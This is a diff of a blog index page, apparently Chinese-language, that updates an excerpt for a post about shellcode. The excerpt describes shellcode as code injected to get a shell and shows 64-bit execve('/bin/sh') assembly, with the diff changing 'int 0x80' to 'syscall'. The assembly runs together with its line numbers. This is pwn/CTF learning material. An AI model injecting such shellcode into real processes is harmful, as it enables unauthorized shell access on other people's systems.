@@ -306,7 +306,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2025/01/26/shellcode/" target="_self">
         <div>
-          shellcode原理 就是一段可以插入到程序或系统中并被执行的代码，shellcode的作用就是getshell  编写64位 1234567mov rax,0x68732f6e69622f ;这里后面那一大串是/bin/shpush raxmov rdi,rsp    ;这两行使rdi指向/bin/shxor rsi,rsixor rdx,rdxmov rax,0x3bint 0x80  插入
+          shellcode原理 就是一段可以插入到程序或系统中并被执行的代码，shellcode的作用就是getshell  编写64位 1234567mov rax,0x68732f6e69622f ;这里后面那一大串是/bin/shpush raxmov rdi,rsp    ;这两行使rdi指向/bin/shxor rsi,rsixor rdx,rdxmov rax,0x3bsyscall  插入1
         </div>
       </a>
 
